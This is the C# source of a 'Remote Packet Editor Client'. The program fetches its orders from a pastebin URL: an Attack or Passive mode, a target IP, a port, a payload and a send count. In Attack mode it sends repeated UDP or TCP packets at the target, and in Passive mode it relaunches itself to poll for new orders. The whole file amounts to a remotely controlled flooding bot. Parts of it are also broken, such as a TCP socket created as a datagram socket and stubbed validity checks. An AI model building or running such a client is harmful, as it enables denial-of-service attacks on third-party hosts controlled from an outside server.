using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Remote_Packet_Editor_Client
{
    class Program
    {
        static void Main(string[] args)
        {
            bool attack = false;
            bool ttsvalid = true;
            bool delayvalid = true;
            Console.Title = "Packet Editor (UDP/TCP)";
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            Console.SetWindowSize(158, Console.WindowHeight);
            Console.WriteLine("   ▄████████    ▄████████   ▄▄▄▄███▄▄▄▄    ▄██████▄      ███        ▄████████         ▄███████▄    ▄████████  ▄████████    ▄█   ▄█▄    ▄████████     ███     "); Thread.Sleep(50);
            Console.WriteLine("  ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄ ███    ███ ▀█████████▄   ███    ███        ███    ███   ███    ███ ███    ███   ███ ▄███▀   ███    ███ ▀█████████▄ "); Thread.Sleep(50);
            Console.WriteLine("  ███    ███   ███    █▀  ███   ███   ███ ███    ███    ▀███▀▀██   ███    █▀         ███    ███   ███    ███ ███    █▀    ███▐██▀     ███    █▀     ▀███▀▀██ "); Thread.Sleep(50);
            Console.WriteLine(" ▄███▄▄▄▄██▀  ▄███▄▄▄     ███   ███   ███ ███    ███     ███   ▀  ▄███▄▄▄            ███    ███   ███    ███ ███         ▄█████▀     ▄███▄▄▄         ███   ▀ "); Thread.Sleep(50);
            Console.WriteLine("▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███   ███   ███ ███    ███     ███     ▀▀███▀▀▀          ▀█████████▀  ▀███████████ ███        ▀▀█████▄    ▀▀███▀▀▀         ███     "); Thread.Sleep(50);
            Console.WriteLine("▀███████████   ███    █▄  ███   ███   ███ ███    ███     ███       ███    █▄         ███          ███    ███ ███    █▄    ███▐██▄     ███    █▄      ███     "); Thread.Sleep(50);
            Console.WriteLine("  ███    ███   ███    ███ ███   ███   ███ ███    ███     ███       ███    ███        ███          ███    ███ ███    ███   ███ ▀███▄   ███    ███     ███     "); Thread.Sleep(50);
            Console.WriteLine("  ███    ███   ██████████  ▀█   ███   █▀   ▀██████▀     ▄████▀     ██████████       ▄████▀        ███    █▀  ████████▀    ███   ▀█▀   ██████████    ▄████▀   "); Thread.Sleep(50);
            Console.WriteLine("  ███    ███                                                                                                              ▀                                  "); Thread.Sleep(50);
            Console.WriteLine("   ▄████████ ████████▄   ▄█      ███      ▄██████▄     ▄████████       ▄████████  ▄█        ▄█     ▄████████ ███▄▄▄▄       ███                               "); Thread.Sleep(50);
            Console.WriteLine("  ███    ███ ███   ▀███ ███  ▀█████████▄ ███    ███   ███    ███      ███    ███ ███       ███    ███    ███ ███▀▀▀██▄ ▀█████████▄                           "); Thread.Sleep(50);
            Console.WriteLine("  ███    █▀  ███    ███ ███▌    ▀███▀▀██ ███    ███   ███    ███      ███    █▀  ███       ███▌   ███    █▀  ███   ███    ▀███▀▀██                           "); Thread.Sleep(50);
            Console.WriteLine(" ▄███▄▄▄     ███    ███ ███▌     ███   ▀ ███    ███  ▄███▄▄▄▄██▀      ███        ███       ███▌  ▄███▄▄▄     ███   ███     ███   ▀                           "); Thread.Sleep(50);
            Console.WriteLine("▀▀███▀▀▀     ███    ███ ███▌     ███     ███    ███ ▀▀███▀▀▀▀▀        ███        ███       ███▌ ▀▀███▀▀▀     ███   ███     ███                               "); Thread.Sleep(50);
            Console.WriteLine("  ███    █▄  ███    ███ ███      ███     ███    ███ ▀███████████      ███    █▄  ███       ███    ███    █▄  ███   ███     ███                               "); Thread.Sleep(50);
            Console.WriteLine("  ███    ███ ███   ▄███ ███      ███     ███    ███   ███    ███      ███    ███ ███▌    ▄ ███    ███    ███ ███   ███     ███                               "); Thread.Sleep(50);
            Console.WriteLine("  ██████████ ████████▀  █▀      ▄████▀    ▀██████▀    ███    ███      ████████▀  █████▄▄██ █▀     ██████████  ▀█   █▀     ▄████▀                             "); Thread.Sleep(50);
            Console.WriteLine("                                                      ███    ███                 ▀                                                                           "); Thread.Sleep(50);
            Console.WriteLine(""); Thread.Sleep(500);
            String strHostName = string.Empty;
            strHostName = Dns.GetHostName();
            IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
            IPAddress[] addr = ipEntry.AddressList;
            WebClient wc = new WebClient();
            string settings = wc.DownloadString("https://pastebin.com/raw/A0dVJ8fg");
            string settingspath = Environment.CurrentDirectory + @"\RPEC\RPEC Settings.txt";
            if (File.Exists(settingspath))
            {
                
            }
            else
            {
                Directory.CreateDirectory(Environment.CurrentDirectory + @"\RPEC");
                File.Create(settingspath);
            }
            File.WriteAllText(settingspath, settings);
            string smode = File.ReadLines(settingspath).Skip(0).Take(1).First();
            string type = File.ReadLines(settingspath).Skip(1).Take(1).First();
            string sport = File.ReadLines(settingspath).Skip(2).Take(1).First();
            string sdelay = File.ReadLines(settingspath).Skip(3).Take(1).First();
            string stts = File.ReadLines(settingspath).Skip(4).Take(1).First(); //"Times To Send"
            string ip = File.ReadLines(settingspath).Skip(5).Take(1).First();
            string sdata = File.ReadLines(settingspath).Skip(6).Take(1).First();
            Int32.TryParse(sport, out int port);
            Int32.TryParse(sdelay, out int delay);
            Int32.TryParse(stts, out int TTS);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Settings Gathered!");
            Console.WriteLine("");
            if (smode == "Attack")
            {
                attack = true;
            }
            else if (smode == "Passive")
            {
                attack = false;
            }
            var stopwatch = new Stopwatch();
            if (attack == false)
            {
                while (attack == false)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Checking...");
                    Console.WriteLine("");
                    Thread.Sleep(2500);
                    if (smode == "Attack")
                    {
                        attack = true;
                    }
                    else if (smode == "Passive")
                    {
                        attack = false;
                    }
                    Console.Clear();
                    ProcessStartInfo p_info = new ProcessStartInfo();
                    p_info.UseShellExecute = true;
                    p_info.CreateNoWindow = false;
                    p_info.WindowStyle = ProcessWindowStyle.Normal;
                    p_info.FileName = Environment.CurrentDirectory + @"\Remote Packet Editor Client";
                    Process.Start(p_info);
                    Environment.Exit(0);
                }
            }
            while (attack == true)
            {
                if (type == "UDP")
                {
                    byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes(sdata);
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
                    Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    for (int i = 0; i <= TTS; i++)
                    {
                        client.SendTo(packetData, ep);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.Write("Sent packetData ");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.Write("'");
                        Console.ForegroundColor = ConsoleColor.Blue;
                        Console.Write(sdata);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("'");
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        Console.WriteLine("Sent To: " + ip);
                        Console.WriteLine("");
                        Thread.Sleep(delay);
                        if (smode == "Attack")
                        {
                            attack = true;
                        }
                        else if (smode == "Passive")
                        {
                            attack = false;
                        }
                    }
                    attack = false;

                    if (ttsvalid == true)
                    {
                        if (delayvalid == true)
                        {
                            //disabled for now
                        }
                        else
                        {
                            Console.Clear();
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("ERROR: '" + delay + "' is OVER the maximum amount (250)");
                            Console.ReadKey();
                        }
                    }
                    else
                    {
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("ERROR: '" + TTS + "' is OVER the maximum amount (100)");
                        Console.ReadKey();
                    }
                }
                else if (type == "TCP")
                {
                    byte[] packetData = System.Text.ASCIIEncoding.ASCII.GetBytes(sdata);
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
                    Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Tcp);
                    if (ttsvalid == true)
                    {
                        if (delayvalid == true)
                        {
                            for (int i = 0; i <= TTS; i++)
                            {
                                client.SendTo(packetData, ep);
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.Write("Sent packetData ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.Write("'");
                                Console.ForegroundColor = ConsoleColor.Blue;
                                Console.Write(sdata);
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine("'");
                                Console.ForegroundColor = ConsoleColor.DarkGray;
                                Console.WriteLine("Sent To:" + ip);
                                Console.WriteLine("");
                                Thread.Sleep(delay);
                                if (smode == "Attack")
                                {
                                    attack = true;
                                }
                                else if (smode == "Passive")
                                {
                                    attack = false;
                                }
                            }
                        }
                        else
                        {
                            Console.Clear();
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("ERROR: '" + delay + "' is OVER the maximum amount (250)");
                            Console.ReadKey();
                        }
                    }
                    else
                    {
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("ERROR: '" + TTS + "' is OVER the maximum amount (100)");
                        Console.ReadKey();
                    }
                }
                else
                {
                    Console.Beep(500, 1000);
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("ERROR: 'UDP' or 'TCP' were not found.");
                    Console.ReadKey();
                }
            }
        }
    }
}
